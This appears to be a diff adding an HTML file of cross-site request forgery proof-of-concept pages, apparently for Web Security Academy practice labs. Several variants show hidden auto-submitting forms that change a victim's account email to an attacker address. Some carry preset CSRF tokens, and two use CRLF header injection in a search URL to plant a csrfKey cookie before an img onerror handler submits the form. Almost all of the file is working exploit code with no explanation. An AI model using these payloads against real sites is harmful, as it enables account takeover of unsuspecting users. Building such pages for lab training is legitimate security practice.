@@ -1,0 +1,82 @@
+<!-- LAB NO 3 -->
+<!-- <html>
+    <body>
+        <h1>You have been hacked !! </h1>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="https://0a8000f30445b20a82ea4c4000540082.web-security-academy.net/my-account/change-email"
+              method="post" id="csrf-form" target="csrf-iframe">
+              <input type="hidden" name="email" value="hack@gmail.com">
+        </form>
+        <script>document.getElementById('csrf-form').submit()</script>
+    </body>
+</html>
+ -->
+
+ <!-- LAB NO 4 -->
+<!-- <html>
+    <body>
+        <h1>You have been hacked !! </h1>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="https://0a640020039717e480009ff20020005d.web-security-academy.net/my-account/change-email"
+              method="post" id="csrf-form" target="csrf-iframe">
+              <input type="hidden" name="email" value="hack@gmail.com">
+              <input type="hidden" name="csrf" value="zhjsHQRuZKA4fZMVwITVYQ7I1O7reV81" >
+        </form>
+        <script>document.getElementById('csrf-form').submit()</script>
+    </body>
+</html> -->
+
+
+<!-- <html>
+    <body>
+        <h1>You have been hacked !! </h1>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="https://0a9900fb03295f93818468b800b40096.web-security-academy.net/my-account/change-email" 
+        method="post" id="csrf-form" target="csrf-iframe"
+        >
+        <input type="hidden" name="email" value="hack@gmail.com">
+        <input type="hidden" name="csrf" value="6ZxWMRX4DNMwpd9ys1W60FAt6aWSRIQH">
+        </form>
+        <img 
+        style="display:none" 
+        src="https://0a9900fb03295f93818468b800b40096.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=SWpfV358l83c3kInKTnMtkvIqW15P50d%3b%20SameSite=None"
+            onerror="document.getElementById('csrf-form').submit()" />
+
+    </body>
+</html> -->
+
+<!-- csrf-key=JvxECy2HtjzlxjRUi2eMYbHCXhNSjN2J -->
+
+
+<!-- LAB CSRF where token is duplicated in cookie -->
+
+
+<html>
+    <body>
+        <h1>you have been hacked </h1>
+        <iframe style="display:none" name="csrf-iframe" ></iframe>
+        <form action="https://0aac00cf036bd6f28017d0950056006f.web-security-academy.net/my-account/change-email"
+              method="post" id="csrf-form" target="csrf-iframe">
+            <input type="hidden" name="email" value="hack2@gmail.com">
+            <input type="hidden" name="csrf" value="OlXJaZp73mFbXEvTPbiYHTsKRkc6ChZJ" >
+
+        </form>
+        <!-- <script>document.getElementById('csrf-form').submit()</script> -->
+        <img 
+        style="display:none" 
+        src="https://0aac00cf036bd6f28017d0950056006f.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=OlXJaZp73mFbXEvTPbiYHTsKRkc6ChZJ%3b%20SameSite=None"
+            onerror="document.getElementById('csrf-form').submit()" />
+    </body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
